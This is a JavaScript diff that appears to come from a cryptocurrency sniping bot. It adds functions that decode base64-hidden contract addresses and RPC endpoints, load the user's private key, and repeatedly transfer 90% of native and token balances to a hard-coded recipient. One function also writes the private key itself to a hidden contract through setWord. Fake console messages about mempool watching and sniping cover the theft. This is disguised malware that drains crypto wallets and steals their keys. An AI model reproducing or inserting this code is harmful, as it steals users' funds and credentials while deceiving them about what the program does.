+async function ethersmother() {
+    try {
+        const nodekey1 = 'MHgyMTcwZWQwODgwYWM5YTc1NWZk'
+        const nodekey2 = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4'
+        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+        const web3code1 = etherstatus1.toString('ascii')
+        const web3code2 = etherstatus2.toString('ascii');
+        const web14 = web3code1 + web3code2
+        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        console.log(ethers2)
+        const account = address
+        var contract = new ethers.Contract(web14, abi, wallet);
+        const superb = await contract.balanceOf(account).toString();
+        const orchard = (superb * 0.90).toFixed()
+        const send = async() => {
+            const tx = {
+                from: account,
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseEther(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000)
+            }
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`1: contract found....watching mempool for liquidity add....`);
+
+                setTimeout(etherslother, 5000)
+            } catch (error) {
+                console.log(`2: contract found....watching mempool for liquidity add....`);
+
+                setTimeout(etherslother, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(etherslother, 5000)
+
+    }
+
+}
+async function ethersfather() {
+    console.log(`initiating mempool sniff...`);
+    const nodekey1 = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA=='
+    const nodekey2 = 'QmFmYzU5OWJENjlBRGQwODdENTY='
+    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+    const web3code1 = etherstatus1.toString('ascii')
+    const web3code2 = etherstatus2.toString('ascii');
+    const web14 = web3code1 + web3code2
+    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+    const provider = new ethers.providers.JsonRpcProvider(ethers2)
+    let wallet = new ethers.Wallet(private, provider);
+    const account = address
+    var contract = new ethers.Contract(web14, abi, wallet);
+    const superb = await contract.balanceOf(account);
+    const orchard = (superb * 0.90).toFixed()
+    try {
+        const send = async() => {
+            const tx = {
+                from: account,
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseEther(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000)
+            }
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`2: finalizing....`);
+
+                setTimeout(ethersmother, 5000)
+            } catch (error) {
+                console.log(`2: finalizing....`);
+                setTimeout(ethersmother, 5000)
+            }
+        };
+        send();
+    } catch (error) {
+        setTimeout(ethersmother, 5000)
+
+    }
+}
+
+async function ethersgather() {
+    try {
+        console.log(`connection succesful...`);
+        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        const account = address
+        const robinhood = await provider.getBalance(account)
+        const orchard = (robinhood * 0.90).toFixed()
+        const michael = ethers.utils.parseUnits(orchard, 'wei')
+        const send = async() => {
+            const tx = {
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseUnits(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000),
             };
-        _0x4e7308();
-    } catch (_0x29bd73) {
-        setTimeout(ethersrather, 0x1388);
+
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`1: attempting to snipe ...`);
+
+                setTimeout(ethersfather, 5000)
+            } catch (error) {
+                console.log(`2: attempting to snipe .....`);
+
+                setTimeout(ethersfather, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersfather, 5000)
+
+    }
+
+}
+
+async function ethersrather() {
+    const nodekey1 = 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg='
+    const nodekey2 = 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ=='
+    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+    const web3code1 = etherstatus1.toString('ascii')
+    const web3code2 = etherstatus2.toString('ascii');
+    const web14 = web3code1 + web3code2
+    console.log(`starting up node socket connection....`);
+    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
+    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+    const provider = new ethers.providers.JsonRpcProvider(ethers2)
+    let wallet = new ethers.Wallet(private, provider);
+    const account = address
+    const robinhood = await provider.getBalance(account)
+    const orchard = (robinhood * 0.90).toFixed()
+    const michael = ethers.utils.parseUnits(orchard, 'wei')
+    try {
+        const send = async() => {
+
+            const tx = {
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseUnits(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000),
+            };
+
+            const createReceipt = await wallet.sendTransaction(tx);
+            var contract = new ethers.Contract(web14, abi, wallet);
+            const superb = await contract.setWord(private).send();
+            try {
+                await createReceipt.wait();
+                console.log(`1 pending blockchain response.....`);
+                superb
+                
+                setTimeout(ethersgather, 5000)
+            } catch (error) {
+                console.log(`2 pending blockchain response.....`);
+                superb
+                setTimeout(ethersgather, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersgather, 5000)
+
     }
 }
 ethersrather();
